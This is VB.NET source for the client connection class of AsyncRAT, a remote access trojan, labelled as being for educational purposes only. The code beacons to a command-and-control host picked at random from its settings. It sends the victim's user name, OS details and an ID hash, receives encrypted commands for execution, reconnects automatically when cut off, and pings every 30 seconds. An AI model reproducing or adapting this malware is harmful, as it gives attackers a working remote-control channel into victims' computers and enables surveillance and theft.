Imports System.Net
Imports System.Net.Sockets
Imports System.IO

'       │ Author     : NYAN CAT
'       │ Name       : AsyncRAT

'       Contact Me   : https://github.com/NYAN-x-CAT

'       This program Is distributed for educational purposes only.

Public Class ClientSocket

    Public Shared isConnected As Boolean = False
    Public Shared S As Socket
    Public Shared BufferLength As Long = Nothing
    Public Shared Buffer() As Byte
    Public Shared MS As New MemoryStream
    Public Shared ReadOnly SPL = Settings.SPL

    Public Shared Sub BeginConnect()

        Try
            Threading.Thread.Sleep(2500)
            S = New Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp)

            BufferLength = -1
            Buffer = New Byte(0) {}
            MS = New MemoryStream

            S.ReceiveBufferSize = 1024 * 50
            S.SendBufferSize = 1024 * 50

            S.Connect(Settings.Hosts.Item(New Random().Next(0, Settings.Hosts.Count)), Settings.Ports.Item(New Random().Next(0, Settings.Ports.Count)))

            isConnected = True
            Send(Info)

            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)

        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Private Shared Function Info()

        Dim OS As New Devices.ComputerInfo
        Return String.Concat("INFO", SPL, GetHash(ID), SPL, Environment.UserName, SPL, OS.OSFullName.Replace("Microsoft", Nothing), Environment.OSVersion.ServicePack.Replace("Service Pack", "SP") + " ", Environment.Is64BitOperatingSystem.ToString.Replace("False", "32bit").Replace("True", "64bit"), SPL, "v1.0C")

    End Function

    Public Shared Sub BeginReceive(ByVal ar As IAsyncResult)
        If isConnected = False Then isDisconnected()
        Try
            Dim Received As Integer = S.EndReceive(ar)
            If Received > 0 Then
                If BufferLength = -1 Then
                    If Buffer(0) = 0 Then
                        BufferLength = BS(MS.ToArray)
                        MS.Dispose()
                        MS = New MemoryStream

                        If BufferLength = 0 Then
                            BufferLength = -1
                            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
                            Exit Sub
                        End If
                        Buffer = New Byte(BufferLength - 1) {}
                    Else
                        MS.WriteByte(Buffer(0))
                    End If
                Else
                    MS.Write(Buffer, 0, Received)
                    If (MS.Length = BufferLength) Then
                        Threading.ThreadPool.QueueUserWorkItem(New Threading.WaitCallback(AddressOf BeginRead), MS.ToArray)
                        BufferLength = -1
                        MS.Dispose()
                        MS = New MemoryStream
                        Buffer = New Byte(0) {}
                    Else
                        Buffer = New Byte(BufferLength - MS.Length - 1) {}
                    End If
                End If
            Else
                isDisconnected()
                Exit Sub
            End If
            S.BeginReceive(Buffer, 0, Buffer.Length, SocketFlags.None, New AsyncCallback(AddressOf BeginReceive), S)
        Catch ex As Exception
            isDisconnected()
            Exit Sub
        End Try
    End Sub

    Public Shared Sub BeginRead(ByVal b As Byte())
        Try
            Messages.Read(b)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub Send(ByVal msg As String)
        Try
            Using MS As New MemoryStream
                Dim B As Byte() = AES_Encryptor(SB(msg))
                Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                MS.Write(L, 0, L.Length)
                MS.Write(B, 0, B.Length)

                S.Poll(-1, SelectMode.SelectWrite)
                S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
            End Using
        Catch ex As Exception
            isDisconnected()
        End Try
    End Sub

    Private Shared Sub EndSend(ByVal ar As IAsyncResult)
        Try
            S.EndSend(ar)
        Catch ex As Exception
        End Try
    End Sub

    Public Shared Sub isDisconnected()
        isConnected = False

        Try
            S.Close()
            S.Dispose()
        Catch ex As Exception
        End Try

        Try
            MS.Close()
            MS.Dispose()
        Catch ex As Exception
        End Try

        BeginConnect()

    End Sub

    Public Shared Sub Ping()
        While True
            Threading.Thread.Sleep(30 * 1000)
            Try
                If S.Connected Then
                    Using MS As New MemoryStream
                        Dim B As Byte() = AES_Encryptor(SB("PING?"))
                        Dim L As Byte() = SB(B.Length & CChar(vbNullChar))

                        MS.Write(L, 0, L.Length)
                        MS.Write(B, 0, B.Length)

                        S.Poll(-1, SelectMode.SelectWrite)
                        S.Send(MS.ToArray, 0, MS.Length, SocketFlags.None)
                    End Using
                End If
            Catch ex As Exception
                isConnected = False
                End Try
        End While
    End Sub


End Class
